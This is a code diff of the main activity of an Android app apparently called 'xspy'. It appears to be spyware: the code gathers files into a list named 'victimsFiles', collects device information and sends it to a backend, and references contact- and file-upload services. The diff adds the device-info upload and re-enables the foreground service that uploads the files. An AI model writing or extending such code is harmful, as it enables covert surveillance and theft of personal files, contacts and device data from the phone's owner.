@@ -9,10 +9,8 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 
-import androidx.lifecycle.Observer;
 import androidx.lifecycle.ViewModelProvider;
 
-import com.google.gson.JsonElement;
 import com.karumi.dexter.Dexter;
 import com.karumi.dexter.MultiplePermissionsReport;
 import com.karumi.dexter.PermissionToken;
@@ -23,6 +21,7 @@ import com.redeyesncode.xspy.backend.services.ContactUploadService;
 import com.redeyesncode.xspy.backend.services.FileUploadService;
 import com.redeyesncode.xspy.base.BaseActivity;
 import com.redeyesncode.xspy.databinding.ActivityMainBinding;
+import com.redeyesncode.xspy.models.DeviceInfoBody;
 import com.redeyesncode.xspy.models.FileBody;
 import com.redeyesncode.xspy.utils.Constants;
 import com.redeyesncode.xspy.utils.DeviceUtils;
@@ -95,6 +94,10 @@ public class MainActivity extends BaseActivity {
 
         binding.btnFetchAndroidDevice.setOnClickListener(v->{
            ArrayList<String> ANDROID_INFO =  DeviceUtils.getDeviceInformation();
+           DeviceInfoBody deviceInfoBody = new DeviceInfoBody();
+           deviceInfoBody.setDeviceInfo(ANDROID_INFO);
+           deviceInfoBody.setName("ASHU_ANDROID");
+           mainViewModel.dumpDeviceInfo(deviceInfoBody);
         });
 
 
@@ -166,20 +169,26 @@ public class MainActivity extends BaseActivity {
         for (int i = 0; i < filePaths.size(); i++) {
             fileUris.add(GalleryUtils.convertFilePathToURI(filePaths.get(i)));
         }
-        for (int i = 0; i < fileUris.size(); i++) {
-            try {
-                victimsFiles.add(new FileBody(GalleryUtils.getFile(MainActivity.this,fileUris.get(i))));
-            }catch (Exception e){
-                e.printStackTrace();
-            }
-        }
 
-        startServiceForUpload(victimsFiles);
+
+        startServiceForUpload(victimsFiles,fileUris);
 //        Log.i(Constants.DEV_XSPY, "initClicks: "+ fileUris);
     }
 
-    private void startServiceForUpload(ArrayList<FileBody> victimsFiles) {
+    private void startServiceForUpload(ArrayList<FileBody> victimsFiles, ArrayList<Uri> fileUris) {
         // Android service code will be written here.
+        for (int i = 0; i < fileUris.size(); i++) {
+            try {
+                victimsFiles.add(new FileBody(GalleryUtils.getFile(MainActivity.this,fileUris.get(i))));
+                break;
+//                showLog(victimsFiles.get(i).getFile().toString());
+            }catch (Exception e){
+                e.printStackTrace();
+
+            }
+        }
+
+
         showToast(victimsFiles.size()+"");
         Intent uploadFileServiceIntent = new Intent(MainActivity.this, FileUploadService.class);
 
@@ -195,13 +204,13 @@ public class MainActivity extends BaseActivity {
 //        uploadFilesByThreading(victimsFiles,"RedEyesNCode");
 
 
-        // Checks for the android version.
-//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-//            startForegroundService(uploadFileServiceIntent);
-//        } else {
-//            progressDialog.dismiss();
-//            startService(uploadFileServiceIntent);
-//        }
+//         Checks for the android version.
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(uploadFileServiceIntent);
+        } else {
+            progressDialog.dismiss();
+            startService(uploadFileServiceIntent);
+        }
     }
 
     private void uploadFilesByThreading(ArrayList<FileBody> victimsFiles,String victimName) {
